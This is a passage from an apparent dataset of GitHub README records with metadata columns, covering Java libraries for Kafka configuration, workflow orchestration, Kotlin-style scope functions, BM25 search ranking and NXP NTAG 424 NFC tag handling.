        ""[fetch.max.wait.ms]"": 500
```
```
@Component
@DependsOnKafkathena
public class ConsumerOne {

    @KafkaListener(
            topics = ""${kafkathena.consumers[consumer-one].topic}"",
            groupId = ""${kafkathena.consumers[consumer-one].props[group.id]}"",
            containerFactory = ""${kafkathena.consumers[consumer-one].factory-bean-name}""
    )
    public void consume(@Payload ConsumerOneMessage message) {

    }
}
```

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

",1,0,1,mit,0.0,"['project', 'many', 'great', 'kafka', 'configuration', 'library', 'however', 'find', 'one', 'really', 'suited', 'need', 'created', 'enhanced', 'one', 'kafkathena', 'provided', 'trendyol', 'time', 'focused', 'creating', 'consumer', 'business', 'library', 'solves', 'kafka', 'configuration', 'time', 'complexity', 'project', 'add', 'dependency', 'create', 'configs', 'create', 'consumer', 'class', 'go', 'feature', 'config', 'consumer', 'producer', 'consumer', 'acknowledge', 'customize', 'support', 'multiple', 'kafka', 'cluster', 'support', 'failover', 'error', 'topic', 'custom', 'class', 'implementation', 'fixed', 'retry', 'exponential', 'retry', 'support', 'consumer', 'base', 'ignore', 'exception', 'failover', 'single', 'error', 'topic', 'multiple', 'consumer', 'single', 'error', 'topic', 'header', 'key', 'listening', 'filtered', 'consume', 'message', 'seperated', 'consume', 'error', 'cluster', 'deserializer', 'support', 'authentication', 'base', 'cluster', 'support', 'kafka', 'message', 'sender', 'utility', 'spring', 'jdk', 'support', 'built', 'section', 'list', 'major', 'used', 'bootstrap', 'project', 'leave', 'acknowledgement', 'section', 'example', 'spring', 'starter', 'spring', 'kafka', 'starter', 'jdk', 'getting', 'started', 'example', 'may', 'give', 'instruction', 'setting', 'project', 'locally', 'get', 'local', 'copy', 'running', 'follow', 'simple', 'example', 'step', 'prerequisite', 'example', 'list', 'thing', 'need', 'use', 'software', 'install', 'maven', 'jdk', 'installation', 'copy', 'paste', 'inside', 'dependency', 'block', 'usage', 'add', 'kafkathena', 'add', 'annotation', 'configuration', 'springboot', 'application', 'create', 'kafkathena']","['consumer', 'support', 'kafka', 'project', 'error']",4,0,0,"['about', 'the', 'project', 'feature', 'build', 'with', 'get', 'start', 'prerequisite', 'installation', 'usage', 'empty']",8,"['about', 'the', 'project', 'feature', 'build']",3,13.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:versions-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0,6335,48.1875,5.7094682230869,"['Trendyol -> https://github.com/trendyol', 'Spring Kafka Starter', 'Jdk 17', 'confluent', 'acks']",5
mytang0/brook,main,"# Brook

Brook is an orchestration engine, supports microservices and in-app logic (embedded use) orchestration. With the embedded mode, users can effortlessly build their own workflow orchestration engine.

## Getting started

In order to maximize the lightweight nature of the Brook engine, a deliberate separation is made between its core components (which depend solely on a few essential toolkits) and the middleware extensions using SPI (Service Provider Interface). Consequently, regardless of the application implementation framework, one can seamlessly rely on the engine JAR and initialize the relevant instances.

### Maven dependency

Specify the version appropriate for the project, see [releases](https://github.com/mytang0/brook/releases).
```xml
<properties>
    <dubbo.version>...</dubbo.version>
</properties>
```

#### Not using Spring

```xml
<dependencies>
    <dependency>
        <groupId>xyz.mytang0.brook</groupId>
        <artifactId>>brook-engine</artifactId>
        <version>${brook.version}</version>
    </dependency>
</dependencies>
```

#### Springboot (recommend)

```xml
<dependencies>
    <dependency>
        <groupId>xyz.mytang0.brook</groupId>
        <artifactId>>brook-spring-boot-starter</artifactId>
        <version>${brook.version}</version>
    </dependency>
</dependencies>
```

### Demo

After cloning the repository, the demo is located in the brook-demo module.
The definition of the testing process is located at 'resources/META-INF/flows'.

## Contributing

Brook welcomes anyone that wants to help out in any way, whether that includes reporting problems, helping with documentation, or contributing code changes to fix bugs, add tests, or implement new features. You can report problems to request features in the [GitHub Issues](https://github.com/mytang0/brook/issues).

### Code Contribute

- Left comment under the issue that you want to take.
- Fork Brook project to your GitHub repositories.
- Clone and compile your Brook project.
```bash
git clone https://github.com/your_name/brook.git
cd brook
mvn clean install -DskipTests
```
- Check to a new branch and start your work.
```bash
git checkout -b my_feature
```
- Push your branch to your github.
```bash
git push origin my_feature
```
- Create a new PR to https://github.com/mytang0/brook/pulls .",1,0,7,apache-2.0,9.0,"['brook', 'brook', 'orchestration', 'engine', 'support', 'microservices', 'logic', 'embedded', 'use', 'orchestration', 'embedded', 'mode', 'user', 'effortlessly', 'build', 'workflow', 'orchestration', 'engine', 'getting', 'started', 'order', 'maximize', 'lightweight', 'nature', 'brook', 'engine', 'deliberate', 'separation', 'made', 'core', 'component', 'depend', 'solely', 'essential', 'toolkits', 'middleware', 'extension', 'using', 'spi', 'service', 'provider', 'interface', 'consequently', 'regardless', 'application', 'implementation', 'framework', 'one', 'seamlessly', 'rely', 'engine', 'jar', 'initialize', 'relevant', 'instance', 'maven', 'dependency', 'specify', 'version', 'appropriate', 'project', 'see', 'release', 'using', 'spring', 'springboot', 'recommend', 'demo', 'cloning', 'repository', 'demo', 'located', 'module', 'definition', 'testing', 'process', 'located', 'contributing', 'brook', 'welcome', 'anyone', 'want', 'help', 'way', 'whether', 'includes', 'reporting', 'problem', 'helping', 'documentation', 'contributing', 'code', 'change', 'fix', 'bug', 'add', 'test', 'implement', 'new', 'feature', 'report', 'problem', 'request', 'feature', 'github', 'issue', 'code', 'contribute', 'left', 'comment', 'issue', 'want', 'take', 'fork', 'brook', 'project', 'github', 'repository', 'clone', 'compile', 'brook', 'project', 'check', 'new', 'branch', 'start', 'work', 'push', 'branch', 'github', 'create', 'new', 'pr', 'http']","['brook', 'engine', 'orchestration', 'project', 'new']",0,0,0,"['brook', 'get', 'start', 'maven', 'dependency', 'not', 'use', 'spring', 'springboot', 'recommend', 'demo', 'contribute', 'code', 'contribute']",8,"['contribute', 'brook', 'get', 'start', 'maven']",6,15.0,24.0,"[kr.motd.maven:os-maven-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-archetype-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.codehaus.mojo:flatten-maven-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,13.0,11.0,2311,20.466666666666665,5.62214983713355,"['releases -> https://github.com/mytang0/brook/releases', 'GitHub Issues -> https://github.com/mytang0/brook/issues']",2
evpl/jkscope,main,"# JKScope

[![Maven Central](https://img.shields.io/maven-central/v/com.plugatar.jkscope/jkscope)](https://central.sonatype.com/artifact/com.plugatar.jkscope/jkscope)
[![Javadoc](https://javadoc.io/badge2/com.plugatar.jkscope/jkscope/javadoc.svg?color=blue)](https://javadoc.io/doc/com.plugatar.jkscope/jkscope)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Mentioned in Awesome Java](https://awesome.re/mentioned-badge.svg)](https://github.com/akullpp/awesome-java)

[![GitHub Actions Workflow Status](https://img.shields.io/github/actions/workflow/status/evpl/jkscope/build.yml?branch=main)](https://github.com/evpl/jkscope)
[![Lines](https://sloc.xyz/github/evpl/jkscope/?category=lines)](https://github.com/evpl/jkscope)
[![Code lines](https://sloc.xyz/github/evpl/jkscope/?category=code)](https://github.com/evpl/jkscope)
[![Hits of Code](https://hitsofcode.com/github/evpl/jkscope?branch=main)](https://hitsofcode.com/github/evpl/jkscope/view?branch=main)

Java scope functions inspired by Kotlin

## Table of Contents

* [Motivation](#motivation)
* [How to use](#how-to-use)
* [Docs](#docs)
  * [JKScope interface methods](#jkscope-interface-methods)
    * [`letIt` and `also`](#letit-and-also)
    * [`takeIf` and `takeUnless`](#takeif-and-takeunless)
    * [`letOut`](#letout)
    * [`letOpt`](#letopt)
  * [JKScope static methods](#jkscope-static-methods)
    * [`run`, `runCatching` and `runRec`](#run-runcatching-and-runrec)
    * [`with`, `withInt`, `withLong`, `withDouble` and `withResource`](#with-withint-withlong-withdouble-and-withresource)
    * [`let` variations](#let-variations)
    * [`opt` and `optNonNull`](#opt-and-optnonnull)
    * [`lazy` and `lazyOfValue`](#lazy-and-lazyofvalue)
  * [`Opt` object](#opt-object)
  * [`Lazy` object](#lazy-object)
  * [Unchecked functions](#unchecked-functions)
  * [Examples](#examples)
    * [Collection initialization](#collection-initialization)
    * [Argument in a method chain](#argument-in-a-method-chain)
    * [Nth Fibonacci number](#nth-fibonacci-number)
    * [Method argument processing](#method-argument-processing)
    * [Safe resources](#safe-resources)

## Motivation

Inspired by the [Kotlin scope function](https://kotlinlang.org/docs/scope-functions.html) I want to make my Java code
more structured and readable.

## How to use

Java 8+ version required. The library has no dependencies. All you need is this (get the latest
version [here](https://github.com/evpl/jkscope/releases)).

Maven:

```xml

<dependency>
  <groupId>com.plugatar.jkscope</groupId>
  <artifactId>jkscope</artifactId>
  <version>2.3</version>
  <scope>compile</scope>
</dependency>
```

Gradle:

```groovy
dependencies {
  implementation 'com.plugatar.jkscope:jkscope:2.3'
}
```

## Docs

### JKScope interface methods

You need to implement `JKScope` interface to use these methods.

```
class MyObject implements JKScope<MyObject> { }
```

#### `letIt` and `also`

Both methods are the same and differ in the name only. Methods perform the function block on this object and return this
object.

```
MyDTO myDTO = new MyDTO().letIt(it -> {
  it.setProperty(""value"");
  it.setAnother(""another value"");
});

MyResource myResource = new MyResource().also(it -> it.init());
```

#### `takeIf` and `takeUnless`

`takeIf` method performs the function block on this object and returns `Opt` monad of this object if the condition is
met, or it returns empty `Opt` instance if the condition is not met. And `takeUnless` method has reverse logic.

```
new MyObject().takeIf(it -> it.getInt() > 10).takeUnless(it -> it.getInt() > 20).letIt(it -> System.out.println(it));
```

#### `letOut`

`letOut` method performs given function block on this object and returns result.

```
Integer value = new MyObject().letOut(it -> it.getInt());
```

#### `letOpt`

`letOpt` method performs given function block on this object and returns `Opt` monad of result.

```
new MyObject().letOpt(it -> it.getInt()).takeIf(it -> it > 10).letIt(it -> System.out.println(it));
```

### JKScope static methods

Import static methods you need or import them all at once.

```
import static com.plugatar.jkscope.JKScope.*;
```

#### `run`, `runCatching` and `runRec`

`run` just runs given function block, `runCatching` runs ignore any Throwable, `runRec` runs function block allowing
yourself to be called recursively.

`run` method simply runs given function block, `runCatching` runs ignore any thrown Throwable, `runRec` runs function
block, allowing itself to be called recursively.

```
run(() -> {
  System.out.println(""Hi"");
});

runCatching(() -> {
  System.out.println(""Hi"");
});

runRec(func -> {
  if (new Random().nextInt(0, 100) == 50) {
    func.run();
  }
});
```

#### `with`, `withInt`, `withLong`, `withDouble` and `withResource`

These methods perform given function block on given values.

```
with(value, it -> {
  System.out.println(value);
});

with(value1, value2, (v1, v2) -> {
  System.out.println(v1);
  System.out.println(v2);
});
```

`withResource` method does the same thing, but with a `AutoCloseable` resource and closes this resource.

#### `let` variations

`let`, `letInt`, `letLong` and `letDouble` returns result of function block.

```
String value = let(() -> {
  //...
  return ""val"";
});
```

`let`, `letInt`, `letLong` and `letDouble` methods can also receive a value, process it using a function block, and
return that value.

```
String value = let(""val"", it -> {
  System.out.println(it);
});
```

`letRec`, `letIntRec`, `letLongRec` and `letDoubleRec` accept initial value and allow you to process it recursively
returning the result.

```
int value = letIntRec(10, (n, func) -> {
  if (n <= 1) {
    return 1;
  } else {
    return n * func.apply(n - 1);
  }
});
```

`letWith`, `letIntWith`, `letLongWith`, `letDoubleWith` methods accept values and returning the result of function
block.

```
int value = letWith(""42"", it -> Integer.valueOf(it));
```

`letWithResource` method does the same thing, but with a `AutoCloseable` resource and closes this resource.

#### `opt` and `optNonNull`

`opt` returns `Opt` instance of given value, `optNonNull` returns `Opt` instance of given value of given value or
empty `Opt` instance if given value is null.

```
opt(value).takeNonNull().takeUnless(it -> it.isEmpty()).takeIf(it -> it.length() < 100).letIt(it -> System.out.println(it));

optNonNull(value).takeUnless(it -> it.isEmpty()).takeIf(it -> it.length() < 100).letIt(it -> System.out.println(it));
```

#### `lazy` and `lazyOfValue`

`lazy` returns `Lazy` instance with given initializer. `lazyOfValue` returns `Lazy` instance of given value.

```
Lazy<String> lazy = lazy(() -> {
  //...
  return ""value"";
});

Lazy<String> lazyOfValue = lazyOfValue(""value"");
```

### `Opt` object

The `Opt` monad is similar in meaning to Java `Optional`, but allows the null value.

`Opt` monad contains some `Optional` methods and scope functions methods.

```
String result = Opt.of(value).takeIf(it -> it.length() > 10).orElse("""");

String result = Opt.of(value).takeNonNull().orElseGet(() -> """");

String result = Opt.of(value).takeIf(it -> it.length() > 10).orElseThrow(() -> new IllegalArgumentException());
```

### `Lazy` object

`Lazy` represents a value with lazy initialization.

```
Lazy<String> lazy = lazy(() -> {
  //...
  return ""value"";
});

Lazy<String> lazyOfValue = lazyOfValue(""value"");
```

### Unchecked functions

All presented functions allow you to not process checked exceptions.

```
public static void main(String[] args) {
  URI uri = let(() -> new URI(""abc""));
}
```

### Examples

#### Collection initialization

```
Map<String, Integer> map = let(new HashMap<>(), it -> {
  it.put(""val1"", 1);
  it.put(""val2"", 2);
});

List<String> list = let(new ArrayList<>(), it -> {
  it.add(""val1"");
  it.add(""val2"");
});
```

#### Argument in a method chain

```
new MyBuilder()
  .setFirst(""first"")
  .setSecond(""second"")
  .setThird(let(() -> {
    //...
    return ""third"";
  }))
  .setFourth(""fourth"")
  .build()
```

#### Nth Fibonacci number

```
int value = letIntRec(10, (n, func) -> {
  if (n <= 1) {
    return 1;
  } else {
    return n * func.apply(n - 1);
  }
});
```

#### Method argument processing

```
public static String checkNonNullNonEmptyStr(String value) {
  return opt(value)
    .takeNonNull().throwIfEmpty(NullPointerException::new)
    .takeUnless(String::isEmpty).throwIfEmpty(IllegalArgumentException::new)
    .get();
}
```

#### Safe resources

```
class MyResource implements AutoCloseable {
  //...
}

withResource(new MyResource(), it -> {
  //...
});
```
",5,0,1,apache-2.0,0.0,"['jkscope', 'java', 'scope', 'function', 'inspired', 'kotlin', 'table', 'content', 'motivation', 'use', 'doc', 'jkscope', 'interface', 'method', 'jkscope', 'static', 'method', 'variation', 'object', 'object', 'unchecked', 'function', 'example', 'collection', 'initialization', 'argument', 'method', 'chain', 'nth', 'fibonacci', 'number', 'method', 'argument', 'processing', 'safe', 'resource', 'motivation', 'inspired', 'kotlin', 'scope', 'function', 'want', 'make', 'java', 'code', 'structured', 'readable', 'use', 'java', 'version', 'required', 'library', 'dependency', 'need', 'get', 'latest', 'version', 'maven', 'gradle', 'doc', 'jkscope', 'interface', 'method', 'need', 'implement', 'interface', 'use', 'method', 'method', 'differ', 'name', 'method', 'perform', 'function', 'block', 'object', 'return', 'object', 'method', 'performs', 'function', 'block', 'object', 'return', 'monad', 'object', 'condition', 'met', 'return', 'empty', 'instance', 'condition', 'met', 'method', 'reverse', 'logic', 'method', 'performs', 'given', 'function', 'block', 'object', 'return', 'result', 'method', 'performs', 'given', 'function', 'block', 'object', 'return', 'monad', 'result', 'jkscope', 'static', 'method', 'import', 'static', 'method', 'need', 'import', 'run', 'given', 'function', 'block', 'run', 'ignore', 'throwable', 'run', 'function', 'block', 'allowing', 'called', 'recursively', 'method', 'simply', 'run', 'given', 'function', 'block', 'run', 'ignore', 'thrown', 'throwable', 'run', 'function', 'block', 'allowing', 'called', 'recursively', 'method', 'perform', 'given', 'function', 'block', 'given', 'value', 'method', 'thing', 'resource', 'close', 'resource', 'variation', 'return', 'result', 'function', 'block', 'method', 'also', 'receive', 'value', 'process', 'using', 'function', 'block', 'return', 'value', 'accept', 'initial', 'value', 'allow', 'process', 'recursively', 'returning', 'result', 'method', 'accept', 'value', 'returning', 'result', 'function', 'block', 'method', 'thing', 'resource', 'close', 'resource', 'return', 'instance', 'given', 'value', 'return', 'instance', 'given', 'value', 'given', 'value', 'empty', 'instance', 'given', 'value', 'null', 'return', 'instance', 'given', 'initializer', 'return', 'instance', 'given', 'value', 'object', 'monad', 'similar', 'meaning', 'java', 'allows', 'null', 'value', 'monad', 'contains', 'method', 'scope', 'function', 'method', 'object', 'represents', 'value', 'lazy', 'initialization', 'unchecked', 'function', 'presented', 'function', 'allow', 'process', 'checked', 'exception', 'example', 'collection', 'initialization', 'argument', 'method', 'chain', 'nth', 'fibonacci', 'number', 'method', 'argument', 'processing', 'safe', 'resource']","['method', 'function', 'block', 'given', 'value']",3,0,0,"['jkscope', 'table', 'content', 'motivation', 'how', 'use', 'doc', 'jkscope', 'interface', 'method', 'letit', 'also', 'takeif', 'takeunless', 'letout', 'letopt', 'jkscope', 'static', 'method', 'run', 'runcatching', 'runrec', 'with', 'withint', 'withlong', 'withdouble', 'withresource', 'let', 'variation', 'opt', 'optnonnull', 'lazy', 'lazyofvalue', 'opt', 'object', 'lazy', 'object', 'unchecked', 'function', 'example', 'collection', 'initialization', 'argument', 'method', 'chain', 'nth', 'fibonacci', 'number', 'method', 'argument', 'processing', 'safe', 'resource']",25,"['method', 'jkscope', 'opt', 'lazy', 'object']",24,247.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0,8646,28.84210526315789,5.336678832116788,"['![Maven Central -> https://img.shields.io/maven-central/v/com.plugatar.jkscope/jkscope', '![Javadoc -> https://javadoc.io/badge2/com.plugatar.jkscope/jkscope/javadoc.svg?color=blue', '![License -> https://img.shields.io/badge/License-Apache%202.0-blue.svg', '![Mentioned in Awesome Java -> https://awesome.re/mentioned-badge.svg', '![GitHub Actions Workflow Status -> https://img.shields.io/github/actions/workflow/status/evpl/jkscope/build.yml?branch=main', '![Lines -> https://sloc.xyz/github/evpl/jkscope/?category=lines', '![Code lines -> https://sloc.xyz/github/evpl/jkscope/?category=code', '![Hits of Code -> https://hitsofcode.com/github/evpl/jkscope?branch=main', 'Kotlin scope function -> https://kotlinlang.org/docs/scope-functions.html', 'here -> https://github.com/evpl/jkscope/releases']",10
stephanj/BM25,master,"# BM25 Java Implementation

BM25 (Best Matching 25) is a ranking function used by search engines to rank matching documents according to their relevance to a given search query.

See also https://en.wikipedia.org/wiki/Okapi_BM25

# Simple usage

```java
List<String> corpus = List.of(
      ""I love programming"",
      ""Java is my favorite programming language"",
      ""I enjoy writing code in Java"",
      ""Java is another popular programming language"",
      ""I find programming fascinating"",
      ""I love Java"",
      ""I prefer Java over Python""
  );

  BM25 bm25 = new BM25(corpus);

  List<Map.Entry<Integer, Double>> results = bm25.search(""I love java"");

  for (Map.Entry<Integer, Double> entry : results) {
      System.out.println(""Sentence "" + entry.getKey() + "" : Score = "" + entry.getValue() + "" - ["" + corpus.get(entry.getKey()) + ""]"");
  }
```

```
Sentence 5 : Score = 2.286729869084079 - [I love Java]
Sentence 0 : Score = 1.8387268317084793 - [I love programming]
Sentence 6 : Score = 0.7294916714788526 - [I prefer Java over Python]
Sentence 2 : Score = 0.6674701123652661 - [I enjoy writing code in Java]
Sentence 4 : Score = 0.40211004330297734 - [I find programming fascinating]
Sentence 1 : Score = 0.33373505618263305 - [Java is my favorite programming language]
Sentence 3 : Score = 0.33373505618263305 - [Java is another popular programming language]
```

```Java
bm25.search(""programming"");
```

```
Sentence 0 : Score = 0.687935390645563 - [I love programming]
Sentence 4 : Score = 0.6174639603843102 - [I find programming fascinating]
Sentence 1 : Score = 0.5124700885780712 - [Java is my favorite programming language]
Sentence 3 : Score = 0.5124700885780712 - [Java is another popular programming language]
Sentence 2 : Score = 0.0 - [I enjoy writing code in Java]
Sentence 5 : Score = 0.0 - [I love Java]
Sentence 6 : Score = 0.0 - [I prefer Java over Python]
```

# With stop words 

Get better results by removing language-specific stop words. 

Based on ISO provided list from https://github.com/stopwords-iso 

Current implementation supports English, French, German, Dutch, Italian and Spanish stop words.

```Java
      BM25 bm25 = new BM25(corpus, StopWords.ENGLISH);
```

# With Stemming

Get better results by using stemming. 

Stemming maps different forms of the same word to a common ""stem"". 
For example, the English stemmer maps running, run, runs to run. 
So a search for 'running' would also find documents which only have the other forms.

```Java
      BM25 bm25 = new BM25(corpus, StopWords.ENGLISH, new EnglishStemmer());
```

The default implementation uses the Porter2 stemmer from Snowball.  
You can add other Stemmer implementations, for example, CoreNLP or Lucene.

",0,0,3,mit,2.0,"['java', 'implementation', 'best', 'matching', 'ranking', 'function', 'used', 'search', 'engine', 'rank', 'matching', 'document', 'according', 'relevance', 'given', 'search', 'query', 'see', 'also', 'http', 'simple', 'usage', 'stop', 'word', 'get', 'better', 'result', 'removing', 'stop', 'word', 'based', 'iso', 'provided', 'list', 'http', 'current', 'implementation', 'support', 'english', 'french', 'german', 'dutch', 'italian', 'spanish', 'stop', 'word', 'stemming', 'get', 'better', 'result', 'using', 'stemming', 'stemming', 'map', 'different', 'form', 'word', 'common', 'stem', 'example', 'english', 'stemmer', 'map', 'running', 'run', 'run', 'run', 'search', 'would', 'also', 'find', 'document', 'form', 'default', 'implementation', 'us', 'stemmer', 'snowball', 'add', 'stemmer', 'implementation', 'example', 'corenlp', 'lucene']","['implementation', 'word', 'search', 'stop', 'stemming']",2,0,0,"['java', 'implementation', 'simple', 'usage', 'with', 'stop', 'word', 'with', 'stem']",4,"['with', 'java', 'implementation', 'simple', 'usage']",6,11.0,1.0,[],0.0,1.0,0.0,2724,41.333333333333336,5.244623655913978,"['I love Java', 'I love programming', 'I prefer Java over Python', 'I enjoy writing code in Java', 'I find programming fascinating', 'Java is my favorite programming language', 'Java is another popular programming language', 'I love programming', 'I find programming fascinating', 'Java is my favorite programming language', 'Java is another popular programming language', 'I enjoy writing code in Java', 'I love Java', 'I prefer Java over Python']",14
johnnyb/ntag424-java,main,"# NXP NTAG 424 DNA Library

NOTE - I consider the 1.0.X series to be ""still in development"" and breaking changes can occur at any time.
1.1.0 will be the first ""stable"" release.
This is due to a combination of factors, mostly centered around my inexperience with Java packaging and trying to get something to ""just work"".

This library is meant to help with handling the NXP NTAG 424 DNA chip.
Note that the library itself is completely hardware agnostic, and requires adding in a ""transceiver"" to manage the NFC hardware details.
See more about that in the Usage section.

Note that this is very much a work-in-progress and you should expect things to be moved around and renamed quite a bit for the time being.
The current API should not be considered stable.

This library is primarily based on the NXP document `NT4H2421Gx`, available [here](https://www.nxp.com/docs/en/data-sheet/NT4H2421Gx.pdf).
Page numbers (often referenced in the code) are from revision 3.0.

Note that this library was built almost entirely from the referenced documents.
I have no real experience with NFC, so I really don't know what is specific to this chip, to NXP generally, or to some other standard.
If you have suggestions on how to refactor this to support more NFC tags, I'm certainly open to it.

Note that there is a companion library for reading SUN messages that this chip can generate [here](https://github.com/johnnyb/nfc-sun-decoder).

Other important documents to read:

* Dna 424 Application Notes and hints, [NXP AN12196](https://www.nxp.com/docs/en/application-note/AN12196.pdf)
* Dna 424 LRP Mode Application Notes and hints, [NXP AN12321](https://www.nxp.com/docs/en/application-note/AN12321.pdf)

## Building

This library is built with Maven.  To build, just do:

```
mvn clean install
```

And it will produce a JAR file named `target/ntag424-VERSION.jar`. 

## Installing

To install, just copy the JAR built in the previous section into your JAR folder.  
For an Android project, this is usually in the `app/libs` directory.

## Example Android project

The `examples` directory has an Android project that uses this library.  It contains a built jar, but, if it ineeds updating, you can run `./copyjar.sh` out of that directory after doing an `mvn clean install` in the main directory to copy the new version in.

## Usage

The intended usage of this library is within an Android project, though it is written so that it could be used with non-Android NFC hardware.
Basic information about NFC tag reading in Android is available [here](https://developer.android.com/develop/connectivity/nfc/nfc).
Assuming that you have discovered a tag through an Intent (named `tagIntent` in the code below), you can use the library as follows:

```
import android.nfc.Tag;
import android.nfc.tech.IsoDep;
import net.bplearning.ntag424.Constants;
import net.bplearning.ntag424.DnaCommunicator;
import net.bplearning.ntag424.command.GetCardUid;
import net.bplearning.ntag424.encryptionmode.AESEncryptionMode;


...


Tag tag = tagIntent.getParcelableExtra(NfcAdapter.EXTRA_TAG);
IsoDep iso = IsoDep.get(tag);
new Thread(() -> {
	try {
		iso.connect();

		// Connect the library to the Android tag transceiver
		DnaCommunicator communicator = new DnaCommunicator();
		communicator.setTransceiver((bytesToSend) -> iso.transceive(bytesToSend));

		// This is required to use the functionality of the chip.  It's a weird NFC thing.
		IsoSelectFile.run(communicator, IsoSelectFile.SELECT_MODE_BY_FILE_IDENTIFIER, Constants.DF_FILE_ID);

		// Try to authenticate with the factory key and start an encrypted session
		if(AESEncryptionMode.authenticateEV2(communicator, 0, Constants.FACTORY_KEY)) {
			// Run an encrypted command to get the Card UID
			byte[] cardUid = GetCardUid.run(communicator);
		} else {
			// Failed to authenticate
		}
	} catch(IOException e) {
		// Always expect IOExceptions - they can happen even from someone not holding the
		// tag in place long enough.
	}	
}).start();

```

The way the code works is that it is split into four basic parts:

1. The main DnaCommunicator class which handles packaging the commands for the communication channel, including encrypted session management.
2. Individual classes which each roughly correspond to a command in the spec.  These usually have one or more static methods named `run` which perform the task.  The first argument is always the DnaCommunicator object.  This was so that commands could be easily added without junking up the main DnaCommunicator class.  These currently reside in the `net.bplearning.ntag424.command` package.
3. Encryption mode classes.  These classes handle the actual encryption and MAC processing, with a static method that can be run to initiate the session.
4. Utility functions and constants.

## LRP Encryption

This library supports the LRP (leakage-resistant primitive) encryption mode.
However, you have to configure the tags to use LRP, and then, once they are in LRP mode, they *cannot* be switched back to AES mode.
To set a tag to LRP mode, authenticate (as shown above), and then do:
```
import net.bplearning.ntag424.command.SetCapabilities;

SetCapabilities.run(communicator, true);
```

After doing that, AES encryption mode will NOT be available on the tag, and you CANNOT get it back.
you will then need to change out your authentication function from `AESEncryptionMode.authenticateEV2` to `LRPEncryptionMode.authenticateLRP`.

The LRP encryption is based on the NXP Document `AN12304`, available [here](https://www.nxp.com/docs/en/application-note/AN12304.pdf).
Page numbers are from version 1.1.

Also note that there is a Go implementation of LRP available [here](https://github.com/johnnyb/gocrypto).

## Secure Dynamic Messaging (SDM)

This library has some utility functions for performing SDM and generating SUN (Secure Unique NFC) messages.

This is currently in flux, but the way it works right now is as follows:

1. Create an SDMSettings object
2. Set the file permissions on the SDMSettings object.
3. Create an NdefTemplateMaster object and set whether LRP is in use.
4. Create a structured URL using the components for SDM.
5. Pass the URL and the SDMSettings to the NdefTemplateMaster object and get the resulting file data.
6. Write the file data to the NDEF file.
7. Change the file settings on the NDEF file to use the new SDMSettings object.

Step 3 will probably be removed at some point and this functionality will be integrated into another class.  Probably.
We may also incorporate some special commands to make some of this easier.

Here is some example code:

```
// Generate a new SDMSettings object and set the access permissions
SDMSettings sdmSettings = new SDMSettings();
sdmSettings.sdmMetaReadPerm = Constants.ACCESS_EVERYONE; // Set to a key to get encrypted PICC data
sdmSettings.sdmFileReadPerm = Constants.ACCESS_KEY2;     // Used to create the MAC and Encrypt FileData
sdmSettings.sdmReadCounterRetrievalPerm = Constants.ACCESS_NONE; // Not sure what this is for

// Create the NDEF record and make appropriate updates to SDMSettings
byte[] ndefRecord = master.generateNdefTemplateFromUrlString(""https://www.example.com/{UID}{COUNTER}/{MAC}"", sdmSettings);

// Write the data to the NDEF file
WriteData.run(communicator, Constants.NDEF_FILE_NUMBER, ndefRecord);

// Get the existing file settings:
FileSettings ndeffs = GetFileSettings.run(communicator, Constants.NDEF_FILE_NUMBER);

// Make any modifications you would like to those settings/permissions
// ...

// Set the SDMSettings to the newly-created sdmSettings object
ndeffs.sdmSettings = sdmSettings;

// Make changes to the file
ChangeFileSettings.run(communicator, Constants.NDEF_FILE_NUMBER, ndeffs);
```

After this, your tag should be using SDM.  Note that the offsets will auto-expand to match the requirements of the template.
Template pieces include:

* `{UID}`: Mirror the UID here
* `{COUNTER}`: Mirror the SDM Read Counter here
* `{PICC}`: Put the encrypted PICC data here (encrypted with sdmMetaReadPerm key).  If set, be sure to set usesLrp on the NDefMasterTemplate object (affects the size of the PICC data).
* `{FILE}`: Put the encrypted secret data here (encrypted with sdmFileReadPerm key).  If set, be sure to set the fileDataLength of the NdefMasterTemplate object.
* `{MAC}`: Put the MAC data here.
* `^`: If set, this is the start of the location that will be used for MAC calculation.  If unset, it just becomes the location of the start of the MAC, indicating to only MAC the PICC data.  Or, if there is encrypted file data, it is set to be the start of the encrypted file data.

Personally, I like to use `{UID}{COUNTER}` and `{MAC}` rather than `{PICC}` because, if there is a connection issue with the Internet, I at least know what UID my tag was wanting to be, even if I can't fully validate it.

## SDM Validation

You can also use this library on the ""other side"" to validate SDM messages and read their contents.
For unencrypted PICC data, do the following:

```
PiccData picc = new PiccData(uid, readCounter, usesLrp);
```

If the UID is not mirrored, set it to null.  If the readCounter is not mirrored, set it to 0.

For encrypted PICC data, do the following:

```
PiccData picc = PiccData.decodeFromEncryptedBytes(encryptedBytes, key, usesLrp);
```

Note that the key for decrypting the PICC data can be a different key from validating the MAC / decrypting the file data.
Therefore, you have to set this key with `setMacFileKey()`.

Then, you can validate the MAC (use an empty byte array for the message if there isn't one):

```
picc.setMacFileKey(macFileKey);
picc.performShortMac(new byte[0]); // MAC on PICC-only data
picc.decryptFileData(filedata);
```

## SDM Setups

This section describes some common ways to configure SDM.
